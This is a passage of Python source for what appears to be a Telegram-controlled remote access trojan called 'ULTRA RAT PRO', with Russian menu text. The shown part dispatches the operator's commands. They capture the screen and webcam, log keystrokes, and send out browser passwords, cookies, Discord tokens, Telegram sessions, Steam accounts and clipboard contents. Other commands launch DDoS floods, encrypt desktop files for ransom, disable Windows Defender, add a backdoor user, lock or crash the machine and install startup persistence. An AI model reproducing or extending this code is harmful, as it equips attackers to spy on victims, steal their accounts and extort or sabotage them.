            await message.answer("❌ Неверный формат")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_email:
        try:
            parts = message.text.split('|')
            if len(parts) >= 6:
                send_email(parts[0], int(parts[1]), parts[2], parts[3], parts[4], parts[5], parts[6])
                await message.answer("✅ Email отправлен")
        except:
            await message.answer("❌ Ошибка отправки")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_ransom:
        encrypt_files(os.path.expanduser('~') + r'\Desktop', message.text)
        await message.answer(f"🔐 Файлы зашифрованы с паролем: {message.text}")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_keyword:
        keywords = [k.strip() for k in message.text.split(',')]
        global keyword_list, keyword_alert_active
        keyword_list = keywords
        keyword_alert_active = True
        asyncio.create_task(monitor_keywords())
        await message.answer(f"🔑 Мониторинг ключевых слов запущен: {', '.join(keywords)}")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_macro_name:
        stop_macro_record()
        start_macro_record()
        await message.answer(f"🎬 Запись макроса '{message.text}' началась. Отправьте 'СТОП' для завершения.")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_file_download:
        path = message.text
        if os.path.exists(path) and os.path.isfile(path):
            await send_file(path, f"📄 {os.path.basename(path)}")
            await message.answer("✅ Файл отправлен")
        else:
            await message.answer("❌ Файл не найден")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_wallpaper:
        await message.answer("❌ Отправьте фото для обоев")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_music:
        await message.answer("❌ Отправьте аудиофайл для воспроизведения")
        await state.clear()
        return
    
    if "ИНФО" in text:
        await send_message(get_system_info_full())
    elif "СКРИН" in text:
        filename = take_screenshot()
        if filename:
            await send_file(filename, "📸 Скриншот")
            os.remove(filename)
        else:
            await message.answer("❌ Ошибка скриншота")
    elif "ФОТО" in text:
        filename = take_photo()
        if filename:
            await send_file(filename, "📷 Фото с камеры")
            os.remove(filename)
        else:
            await message.answer("❌ Камера не найдена")
    elif "ВИДЕО ЭКРАН" in text:
        await state.set_state(Form.waiting_for_screen_record)
        await message.answer("🎥 Длительность (сек):")
    elif "ВИДЕО КАМЕРА" in text:
        await state.set_state(Form.waiting_for_camera_record)
        await message.answer("📹 Длительность (сек):")
    elif "КЕЙЛОГ" in text:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="▶️ Старт", callback_data="key_start"),
             InlineKeyboardButton(text="⏹ Стоп", callback_data="key_stop")],
            [InlineKeyboardButton(text="📄 Лог", callback_data="key_get"),
             InlineKeyboardButton(text="🗑 Очистить", callback_data="key_clear")]
        ])
        await message.answer("⌨️ Кейлоггер:", reply_markup=keyboard)
    elif "МЫШЬ" in text:
        await message.answer("🖱 Управление мышью:", reply_markup=get_mouse_keyboard())
    elif "КЛАВИШИ" in text:
        await message.answer("⌨️ Управление клавишами:", reply_markup=get_keyboard_menu())
    elif "БЛОК" in text:
        system_action("lock")
        await message.answer("🔒 Экран заблокирован")
    elif "ВЫКЛ" in text:
        system_action("shutdown")
        await message.answer("⏻ Выключение...")
    elif "РЕБУТ" in text:
        system_action("reboot")
        await message.answer("🔄 Перезагрузка...")
    elif "СОН" in text:
        system_action("sleep")
        await message.answer("💤 Спящий режим...")
    elif "WIFI" in text:
        await send_message(get_wifi_passwords())
    elif "CHROME" in text:
        await send_message(get_chrome_data())
    elif "COOKIES" in text:
        await send_message(get_chrome_cookies())
    elif "DISCORD" in text:
        tokens = get_discord_token()
        if tokens:
            await send_message(f"🎮 Discord токены:\n{chr(10).join(tokens[:5])}")
        else:
            await message.answer("❌ Токены не найдены")
    elif "TELEGRAM" in text:
        filename = get_telegram_session()
        if filename:
            await send_file(filename, "💬 Сессия Telegram")
            os.remove(filename)
        else:
            await message.answer("❌ Telegram не найден")
    elif "STEAM" in text:
        await send_message(get_steam_accounts())
    elif "БУФЕР" in text:
        data = get_clipboard_data()
        if data:
            await send_message(f"📋 Буфер обмена:\n{str(data)[:2000]}")
        else:
            await message.answer("📋 Буфер пуст")
    elif "ФАЙЛЫ" in text:
        await state.set_state(Form.waiting_for_list)
        await message.answer("📁 Введите путь к папке:")
    elif "ПРОЦЕССЫ" in text:
        await send_message(get_processes())
    elif "УБИТЬ" in text:
        await state.set_state(Form.waiting_for_kill)
        await message.answer("💀 Введите имя процесса:")
    elif "CMD" in text:
        await state.set_state(Form.waiting_for_cmd)
        await message.answer("🖥 Введите команду:")
    elif "САЙТ" in text:
        await state.set_state(Form.waiting_for_url)
        await message.answer("🌐 Введите URL:")
    elif "СООБЩЕНИЕ" in text:
        await state.set_state(Form.waiting_for_message)
        await message.answer("💬 Введите текст:")
    elif "ГРОМКОСТЬ" in text:
        await message.answer("🎵 Громкость:", reply_markup=get_volume_menu())
    elif "АУДИО" in text:
        await state.set_state(Form.waiting_for_audio_record)
        await message.answer("🎤 Длительность (сек):")
    elif "МУЗОН" in text:
        await state.set_state(Form.waiting_for_music)
        await message.answer("🎵 Отправьте музыку или голосовое (всегда играет скрыто)")
    elif "ОБОИ" in text:
        await state.set_state(Form.waiting_for_wallpaper)
        await message.answer("🖼 Отправьте фото для обоев")
    elif "СКАЧАТЬ" in text:
        await state.set_state(Form.waiting_for_file_download)
        await message.answer("⬇️ Введите полный путь к файлу:")
    elif "ЗАГРУЗИТЬ" in text:
        await state.set_state(Form.waiting_for_upload_path)
        await message.answer("📤 Введите путь для сохранения:")
    elif "УДАЛИТЬ" in text:
        await state.set_state(Form.waiting_for_delete)
        await message.answer("🗑 Введите путь:")
    elif "НАПИСАТЬ" in text:
        await state.set_state(Form.waiting_for_write)
        await message.answer("⌨️ Введите текст для ввода:")
    elif "ВСТАВИТЬ" in text:
        await state.set_state(Form.waiting_for_clipboard)
        await message.answer("📋 Введите текст для буфера:")
    elif "ZIP" in text:
        await state.set_state(Form.waiting_for_zip)
        await message.answer("📦 Введите пути через запятую:")
    elif "ПАНЕЛЬ" in text:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Скрыть панель", callback_data="taskbar_hide"),
             InlineKeyboardButton(text="Показать панель", callback_data="taskbar_show")],
            [InlineKeyboardButton(text="Откл. диспетчер", callback_data="taskmgr_off"),
             InlineKeyboardButton(text="Вкл. диспетчер", callback_data="taskmgr_on")],
            [InlineKeyboardButton(text="Скрыть иконки", callback_data="icons_hide"),
             InlineKeyboardButton(text="Показать иконки", callback_data="icons_show")]
        ])
        await message.answer("🖥 Управление Windows:", reply_markup=keyboard)
    elif "CD-ROM" in text:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📀 Открыть", callback_data="cd_open"),
             InlineKeyboardButton(text="💿 Закрыть", callback_data="cd_close")]
        ])
        await message.answer("💿 CD-ROM:", reply_markup=keyboard)
    elif "BEEP" in text:
        beep(1000, 2000)
        await message.answer("🔊 Beep!")
    elif "БЛОК ВВОДА" in text:
        await state.set_state(Form.waiting_for_block_input)
        await message.answer("🔒 Длительность (сек):")
    elif "DDoS" in text:
        await state.set_state(Form.waiting_for_ddos)
        await message.answer("💣 Введите IP:PORT (например 192.168.1.1:80):")
    elif "EMAIL" in text:
        await state.set_state(Form.waiting_for_email)
        await message.answer("📧 Введите: SMTP:PORT|LOGIN|PASS|TO|SUBJECT|BODY")
    elif "ШИФР" in text:
        await state.set_state(Form.waiting_for_ransom)
        await message.answer("🔐 Введите пароль для шифрования:")
    elif "АВТОЗАГРУЗКА" in text:
        if check_startup():
            await message.answer("✅ Автозагрузка уже включена")
        else:
            if add_to_startup():
                await message.answer("✅ Автозагрузка включена")
            else:
                await message.answer("❌ Ошибка")
    elif "РЕСТАРТ" in text:
        await message.answer("🔄 Перезапуск...")
        os.execl(sys.executable, sys.executable, *sys.argv)
    elif "МОНИТОР БУФЕРА" in text:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="▶️ Старт", callback_data="clip_mon_start"),
             InlineKeyboardButton(text="⏹ Стоп", callback_data="clip_mon_stop")]
        ])
        await message.answer("📋 Монитор буфера:", reply_markup=keyboard)
    elif "КЛЮЧ СЛОВА" in text:
        await state.set_state(Form.waiting_for_keyword)
        await message.answer("🔑 Введите ключевые слова через запятую (например: password, login, card):")
    elif "МАКРОС" in text:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🎬 Записать", callback_data="macro_record"),
             InlineKeyboardButton(text="⏹ Стоп запись", callback_data="macro_stop"),
             InlineKeyboardButton(text="▶️ Воспроизвести", callback_data="macro_play")]
        ])
        await message.answer("🎬 Макрос:", reply_markup=keyboard)
    elif "DEFENDER OFF" in text:
        if disable_defender():
            await message.answer("🛡 Windows Defender отключен")
        else:
            await message.answer("❌ Ошибка отключения")
    elif "BACKDOOR" in text:
        if create_backdoor_user():
            await message.answer("👤 Backdoor пользователь создан!\nЛогин: Backdoor\nПароль: Password123!")
        else:
            await message.answer("❌ Ошибка создания")
    elif "WINLOCK" in text:
        try:
            if getattr(sys, 'frozen', False):
                base_path = sys._MEIPASS
            else:
                base_path = os.path.dirname(os.path.abspath(__file__))
            winlock_path = os.path.join(base_path, "prankloc.py")
            if os.path.exists(winlock_path):
                subprocess.Popen([sys.executable, winlock_path], creationflags=subprocess.CREATE_NO_WINDOW)
                await message.answer("🔐 WinLock запущен на удаленном ПК")
            else:
                await message.answer("❌ Файл prankloc.py не найден в папке проекта")
        except:
            await message.answer("❌ Ошибка запуска WinLock")
    elif "BSOD" in text:
        run_bsod()
        await message.answer("💀 BSOD запущен на удаленном ПК")

@dp.message(F.photo)
async def handle_photo(message: types.Message, state: FSMContext):
    if message.chat.id != CHAT_ID:
        return
    
    current_state = await state.get_state()
    
    if current_state == Form.waiting_for_wallpaper:
        file_id = message.photo[-1].file_id
        file_info = await bot.get_file(file_id)
        downloaded = await bot.download_file(file_info.file_path)
        filename = f"wallpaper_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        with open(filename, 'wb') as f:
            f.write(downloaded.read() if hasattr(downloaded, 'read') else downloaded)
        if change_wallpaper_from_file(filename):
            await message.answer("✅ Обои изменены")
        else:
            await message.answer("❌ Ошибка")
        await state.clear()
    else:
        file_id = message.photo[-1].file_id
        file_info = await bot.get_file(file_id)
        downloaded = await bot.download_file(file_info.file_path)
        filename = f"wallpaper_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        with open(filename, 'wb') as f:
            f.write(downloaded.read() if hasattr(downloaded, 'read') else downloaded)
        change_wallpaper_from_file(filename)
        await message.answer("✅ Обои изменены")

@dp.message(F.voice)
async def handle_voice(message: types.Message, state: FSMContext):
    if message.chat.id != CHAT_ID:
        return
    
    current_state = await state.get_state()
    
    if current_state == Form.waiting_for_music:
        if await download_and_play_music(message.voice.file_id):
            await message.answer("🔊 Голосовое воспроизводится (скрыто)")
        else:
            await message.answer("❌ Ошибка воспроизведения")
        await state.clear()
    else:
        if await download_and_play_music(message.voice.file_id):
            await message.answer("🔊 Голосовое воспроизводится (скрыто)")

@dp.message(F.audio)
async def handle_audio(message: types.Message, state: FSMContext):
    if message.chat.id != CHAT_ID:
        return
    
    current_state = await state.get_state()
    
    if current_state == Form.waiting_for_music:
        if await download_and_play_music(message.audio.file_id):
            await message.answer("🔊 Музыка играет (скрыто)")
        else:
            await message.answer("❌ Ошибка воспроизведения")
        await state.clear()
    else:
        if await download_and_play_music(message.audio.file_id):
            await message.answer("🔊 Музыка играет (скрыто)")

@dp.message(F.document)
async def handle_document(message: types.Message, state: FSMContext):
    if message.chat.id != CHAT_ID:
        return
    
    current_state = await state.get_state()
    
    if current_state == Form.waiting_for_music and message.document.mime_type and 'audio' in message.document.mime_type:
        if await download_and_play_music(message.document.file_id):
            await message.answer("🔊 Музыка играет (скрыто)")
        else:
            await message.answer("❌ Ошибка воспроизведения")
        await state.clear()
        return
    
    if current_state == Form.waiting_for_upload_file:
        data = await state.get_data()
        upload_path = data.get('upload_path', '')
        try:
            file_info = await bot.get_file(message.document.file_id)
            downloaded = await bot.download_file(file_info.file_path)
            filename = os.path.join(upload_path, message.document.file_name)
            with open(filename, 'wb') as f:
                f.write(downloaded.read() if hasattr(downloaded, 'read') else downloaded)
            await message.answer(f"✅ Файл загружен в {upload_path}")
        except:
            await message.answer("❌ Ошибка загрузки")
        await state.clear()
        return
    
    try:
        file_info = await bot.get_file(message.document.file_id)
        downloaded = await bot.download_file(file_info.file_path)
        filename = message.document.file_name
        with open(filename, 'wb') as f:
            f.write(downloaded.read() if hasattr(downloaded, 'read') else downloaded)
        await message.answer(f"✅ Файл сохранен: {filename}")
    except:
        await message.answer("❌ Ошибка сохранения")

@dp.callback_query()
async def handle_callback(call: types.CallbackQuery, state: FSMContext):
    global clipboard_monitor_active, keylog_buffer
    
    if call.message.chat.id != CHAT_ID:
        return
    
    data = call.data
    
    if data == "key_start":
        if start_keylogger():
            await call.answer("✅ Кейлоггер запущен")
        else:
            await call.answer("❌ Ошибка")
    elif data == "key_stop":
        stop_keylogger()
        await call.answer("✅ Остановлен")
    elif data == "key_get":
        log = get_keylog()
        if log:
            await send_message(f"📄 Лог:\n{log[:3000]}")
        else:
            await call.answer("❌ Лог пуст")
    elif data == "key_clear":
        keylog_buffer = []
        await call.answer("✅ Лог очищен")
    elif data.startswith("mouse_"):
        action = data.replace("mouse_", "")
        mouse_control(action)
        await call.answer("✅ OK")
    elif data.startswith("key_"):
        key_map = {
            "key_enter": "enter", "key_esc": "esc", "key_tab": "tab",
            "key_space": "space", "key_backspace": "backspace", "key_delete": "delete",
            "key_win": "win", "key_alttab": "alt+tab", "key_altf4": "alt+f4",
            "key_copy": "ctrl+c", "key_paste": "ctrl+v", "key_all": "ctrl+a",
            "key_winr": "win+r", "key_cad": "ctrl+alt+del", "key_prtsc": "printscreen"
        }
        if data in key_map:
            keyboard_press(key_map[data])
            await call.answer("✅ OK")
    elif data.startswith("vol_"):
        action = data.replace("vol_", "")
        control_volume(action)
        await call.answer("✅ OK")
    elif data == "taskbar_hide":
        hide_taskbar()
        await call.answer("✅ Панель скрыта")
    elif data == "taskbar_show":
        show_taskbar()
        await call.answer("✅ Панель показана")
    elif data == "taskmgr_off":
        disable_taskmgr()
        await call.answer("✅ Диспетчер отключен")
    elif data == "taskmgr_on":
        enable_taskmgr()
        await call.answer("✅ Диспетчер включен")
    elif data == "icons_hide":
        change_desktop_icons("hide")
        await call.answer("✅ Иконки скрыты")
    elif data == "icons_show":
        change_desktop_icons("show")
        await call.answer("✅ Иконки показаны")
    elif data == "cd_open":
        open_cd()
        await call.answer("✅ CD открыт")
    elif data == "cd_close":
        close_cd()
        await call.answer("✅ CD закрыт")
    elif data == "clip_mon_start":
        clipboard_monitor_active = True
        asyncio.create_task(monitor_clipboard())
        await call.answer("✅ Монитор буфера запущен")
    elif data == "clip_mon_stop":
        clipboard_monitor_active = False
        await call.answer("✅ Монитор буфера остановлен")
    elif data == "macro_record":
        await state.set_state(Form.waiting_for_macro_name)
        await call.message.answer("🎬 Введите название макроса:")
        await call.answer("OK")
    elif data == "macro_stop":
        if macro_recording:
            stop_macro_record()
            await call.answer("✅ Запись остановлена")
        else:
            await call.answer("❌ Запись не активна")
    elif data == "macro_play":
        if play_macro():
            await call.answer("✅ Макрос воспроизведен")
        else:
            await call.answer("❌ Нет записанного макроса")

async def main():
    hide_process()
    if not check_startup():
        add_to_startup()
    await bot.send_message(CHAT_ID, f"🟢 ULTRA RAT PRO АКТИВИРОВАН\n💻 {platform.node()} | 👤 {getpass.getuser()}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())